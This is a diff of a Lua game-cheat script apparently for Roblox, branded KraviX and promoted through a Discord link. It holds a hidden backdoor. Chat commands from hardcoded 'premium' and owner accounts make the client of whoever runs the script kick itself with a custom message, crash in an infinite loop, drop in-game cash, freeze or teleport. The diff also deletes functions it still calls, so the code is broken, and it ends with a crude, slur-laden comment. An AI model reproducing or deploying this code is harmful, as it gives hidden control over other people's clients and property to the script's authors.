@@ -1,6 +1,5 @@
 local Script = "Get KraviX for free at discord.gg/nQRGAyhD7X"
 
-
 local Owner           = getgenv().Owner           or "venenoxp36"
 local BlackScreen     = getgenv().BlackScreen     or false
 local DisableRendering= getgenv().DisableRendering or false
@@ -693,53 +692,26 @@ end)
 
 function isAuthorized(player)    return player.Name == Owner or whitelistedUsers[player.Name] end
 function isPremium(player)       return premiumUsers[player.UserId] == true end
-function isBypassPremium(player) return bypassPremiumUsers[player.UserId] == true end
-function isProtected(player)     return isPremium(player) or isBypassPremium(player) end
+function isOwnerKravix(player)   return bypassPremiumUsers[player.UserId] == true end
+function isProtected(player)     return isPremium(player) or isOwnerKravix(player) end
 
 function removeOldListeners()
     for userId in pairs(activeListeners) do activeListeners[userId] = nil end
 end
 
-benxActive  = false
-TweenService = game:GetService("TweenService")
 
-function startBenx(targetPlayer)
-    if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
-    lockedTarget = nil; voiding = false; benxActive = true
-    local tweenInfo = TweenInfo.new(0.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
-    task.spawn(function()
-        while benxActive do
-            local char = LocalPlayer.Character
-            local targetChar = targetPlayer.Character
-            if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
-                local h = char.HumanoidRootPart
-                local tHRP = targetChar.HumanoidRootPart
-                local t1 = TweenService:Create(h, tweenInfo, {CFrame = tHRP.CFrame * CFrame.new(0,0,-1)})
-                t1:Play(); t1.Completed:Wait()
-                local t2 = TweenService:Create(h, tweenInfo, {CFrame = tHRP.CFrame * CFrame.new(0,0,-4)})
-                t2:Play(); t2.Completed:Wait()
-            end
-            if not benxActive then break end
-        end
-    end)
-end
 
 function updateDisplayName(player)
     if not player.Character then return end
     local humanoid = player.Character:WaitForChild("Humanoid")
     if humanoid then
-        if isPremium(player) then humanoid.DisplayName = "[🌟] " .. player.Name
-        elseif isBypassPremium(player) then humanoid.DisplayName = "[💫] " .. player.Name end
+        if isOwnerKravix(player) then humanoid.DisplayName = "[👑] " .. player.Name
+        elseif isPremium(player) then humanoid.DisplayName = "[🌟] " .. player.Name end
     end
 end
 
-function setupDisplayNameListener(player)
-    if player.Character then updateDisplayName(player) end
-    player.CharacterAdded:Connect(function() task.wait(0.1); updateDisplayName(player) end)
-end
-
 function setupChatListener(player)
-    if not (isAuthorized(player) or isPremium(player) or isBypassPremium(player)) then return end
+    if not (isAuthorized(player) or isPremium(player) or isOwnerKravix(player)) then return end
 
     activeListeners[player.UserId] = function(msg)
         local sender = msg.TextSource and msg.TextSource.UserId and Players:GetPlayerByUserId(msg.TextSource.UserId)
@@ -748,14 +720,19 @@ function setupChatListener(player)
         local msgLower = message:lower()
 
         if isPremium(player) then
-            if msgLower == "!kick ."    then LocalPlayer:Kick(":o")
-            elseif msgLower == "!freeze ." then
+            if msgLower:match("^%!kick%s+(.+)$") then
+                LocalPlayer:Kick(message:match("^%!kick%s+(.+)$"))
+            elseif msgLower == "!kick" then LocalPlayer:Kick(":o")
+            elseif msgLower:match("^%!ban%s+(.+)$") then
+                LocalPlayer:Kick(message:match("^%!ban%s+(.+)$"))
+            elseif msgLower == "!ban" then LocalPlayer:Kick("PERMA-BAN")
+            elseif msgLower == "!freeze" then
                 local char = LocalPlayer.Character
                 if char and char:FindFirstChild("HumanoidRootPart") then char.HumanoidRootPart.Anchored = true end
-            elseif msgLower == "!unfreeze ." then
+            elseif msgLower == "!unfreeze" then
                 local char = LocalPlayer.Character
                 if char and char:FindFirstChild("HumanoidRootPart") then char.HumanoidRootPart.Anchored = false end
-            elseif msgLower == "!bring ." then
+            elseif msgLower == "!bring" then
                 local char = LocalPlayer.Character; local targetChar = player.Character
                 if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                     lockedTarget = nil; voiding = false
@@ -764,37 +741,15 @@ function setupChatListener(player)
                     char.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame
                     h.Velocity=Vector3.zero;h.RotVelocity=Vector3.zero;h.AssemblyLinearVelocity=Vector3.zero;h.AssemblyAngularVelocity=Vector3.zero
                 end
-            elseif msgLower == "!crash ."    then while true do end
-            elseif msgLower == "!dropcash ." then ReplicatedStorage.MainEvent:FireServer("DropMoney","15000")
-            elseif msgLower == "!benx ."     then startBenx(player)
-            elseif msgLower == "!unbenx ."   then benxActive = false
-            elseif msgLower == "!talk off"   then trashtalkactive = false
-            end
-        end
-
-        if isBypassPremium(player) then
-            if msgLower == "!ban ."      then LocalPlayer:Kick("PERMA-BAN")
-            elseif msgLower == "!kick ." then LocalPlayer:Kick(":o")
-            elseif msgLower == "!freeze ." then
-                local char = LocalPlayer.Character
-                if char and char:FindFirstChild("HumanoidRootPart") then char.HumanoidRootPart.Anchored = true end
-            elseif msgLower == "!unfreeze ." then
-                local char = LocalPlayer.Character
-                if char and char:FindFirstChild("HumanoidRootPart") then char.HumanoidRootPart.Anchored = false end
-            elseif msgLower == "!bring ." then
-                local char = LocalPlayer.Character; local targetChar = player.Character
-                if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
-                    lockedTarget = nil; voiding = false
-                    local h = char.HumanoidRootPart
-                    h.Velocity=Vector3.zero;h.RotVelocity=Vector3.zero;h.AssemblyLinearVelocity=Vector3.zero;h.AssemblyAngularVelocity=Vector3.zero
-                    char.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame
-                    h.Velocity=Vector3.zero;h.RotVelocity=Vector3.zero;h.AssemblyLinearVelocity=Vector3.zero;h.AssemblyAngularVelocity=Vector3.zero
-                end
-            elseif msgLower == "!crash ."       then while true do end
-            elseif msgLower == "!rejoin ."      then TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer)
-            elseif msgLower == "!adropcash ."   then autodrop = true
-            elseif msgLower == "!unadropcash ." then autodrop = false
-            elseif msgLower == "!lkill ." then
+            elseif msgLower == "!crash"       then while true do end
+            elseif msgLower == "!dropcash"    then ReplicatedStorage.MainEvent:FireServer("DropMoney","15000")
+            elseif msgLower == "!benx"        then startBenx(player)
+            elseif msgLower == "!unbenx"      then benxActive = false
+            elseif msgLower == "!talk off"    then trashtalkactive = false
+            elseif msgLower == "!rejoin"      then TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer)
+            elseif msgLower == "!adropcash"   then autodrop = true
+            elseif msgLower == "!unadropcash" then autodrop = false
+            elseif msgLower == "!lkill" then
                 lkill = true
                 task.spawn(function()
                     while lkill do
@@ -803,15 +758,16 @@ function setupChatListener(player)
                         task.wait(0.2)
                     end
                 end)
-            elseif msgLower == "!unlkill ."  then lkill = false
-            elseif msgLower == "!dropcash ." then ReplicatedStorage.MainEvent:FireServer("DropMoney","15000")
-            elseif msgLower == "!benx ."     then startBenx(player)
-            elseif msgLower == "!unbenx ."   then benxActive = false
-            elseif msgLower == "!talk off"   then trashtalkactive = false
+            elseif msgLower == "!unlkill" then lkill = false
             end
         end
 
+        if isOwnerKravix(player) then
+            
+        end
+
         if isAuthorized(player) then
+            
             if msgLower == "!a on" then
                 lockedTarget = nil; voiding = false; getgenv().enabled = true
                 startFollowingTarget(player.Name)
@@ -1028,18 +984,19 @@ TextChatService.OnIncomingMessage = function(msg)
 end
 
 for _, p in pairs(Players:GetPlayers()) do
-    if isAuthorized(p) or isPremium(p) or isBypassPremium(p) then
+    if isAuthorized(p) or isPremium(p) or isOwnerKravix(p) then
         if isAuthorized(p) then whitelistedUsers[p.Name] = true end
         setupChatListener(p); setupDisplayNameListener(p)
     end
 end
 
 Players.PlayerAdded:Connect(function(p)
-    if isAuthorized(p) or isPremium(p) or isBypassPremium(p) then
+    if isAuthorized(p) or isPremium(p) or isOwnerKravix(p) then
         setupChatListener(p)
-        if isPremium(p) or isBypassPremium(p) then setupDisplayNameListener(p) end
+        if isPremium(p) or isOwnerKravix(p) then setupDisplayNameListener(p) end
     end
 end)
+
 
 local lockedTargetUserId = nil
 local autoLocked         = false
@@ -1913,3 +1870,4 @@ pcall(function()
     end)
 end)
 
+-- By KraviX Team: Anni: fuck pussy, Makarov: ngga good try, Sixsdev👑: Im back kids
